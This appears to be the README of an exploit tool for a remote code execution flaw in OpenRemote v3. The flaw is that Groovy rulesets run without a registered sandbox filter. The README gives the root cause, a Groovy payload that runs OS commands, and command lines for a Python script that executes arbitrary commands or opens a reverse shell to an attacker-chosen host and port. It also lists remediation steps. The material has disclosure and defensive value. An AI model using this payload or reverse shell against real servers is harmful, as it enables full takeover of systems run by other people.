# OpenRemote — Remote Code Execution via Groovy Rules (Incomplete Sandbox)

## Overview

OpenRemote allows super-users to create Groovy-based rulesets through the Rules API. The Groovy execution environment lacks a functioning sandbox, allowing arbitrary OS command execution on the underlying server.

## Target Version

- **Platform:** OpenRemote v3 (early-to-mid 2025)
- **Keycloak:** 25.0.3
- **Groovy:** 4.0.24
- **Groovy Sandbox:** 4.2.2
- **Nashorn:** 15.7

Version is derived from Git tags at build time via the `axion-release` Gradle plugin. The dependency fingerprint above matches the latest available source as of 2025.

## Severity

- **CVSS:** 8.4 (High)
- **Type:** Remote Code Execution
- **Authentication:** Required (super-user account)

## Affected Component

- **Endpoint:** `POST /api/rules/global`
- **Source File:** `manager/src/main/java/org/openremote/manager/rules/RulesetDeployment.java`
- **Method:** `compileRulesGroovy()` (line 449)

## Root Cause

The `GroovyShell` is configured with a `SandboxTransformer` (line 80), which transforms compiled code to be interceptable by a `GroovyValueFilter`. However, the `GroovyDenyAllFilter` class (line 55–60) is **never registered** at runtime. The enforcement call is commented out:

```java
// TODO Implement sandbox
// new DenyAll().register();
```

Without a registered filter, the transformer has no effect. User-supplied Groovy scripts are parsed and executed with full JVM privileges via `script.run()` (line 473).

## Exploitation

A super-user authenticates via Keycloak, then creates a global ruleset with `lang` set to `GROOVY`. The Groovy script body can call `String.execute()` or use `Runtime.exec()` to run arbitrary OS commands.

### Example Payload

```groovy
def cmd = "whoami"
def proc = cmd.execute()
def output = proc.text
LOG.info("Output: " + output)

rules.when {
    true
}.then {
}
```

## Usage

```
python3 openremote_rce_groovy.py --target http://<host>:8080 --realm master \
    --user <super-user> --password <password> --command "id"
```

### Reverse Shell

```
python3 openremote_rce_groovy.py --target http://<host>:8080 --realm master \
    --user <super-user> --password <password> --reverse-shell --lhost <ip> --lport 4444
```

## Requirements

- Super-user credentials for the target OpenRemote instance
- Python 3.x with `requests`

## Remediation

- Register the `GroovyDenyAllFilter` (or an equivalent allowlist-based filter) before executing any user-supplied Groovy script.
- Restrict access to dangerous classes like `java.lang.Runtime`, `java.lang.ProcessBuilder`, `java.io.File`, and `java.net.*` within the Groovy sandbox.
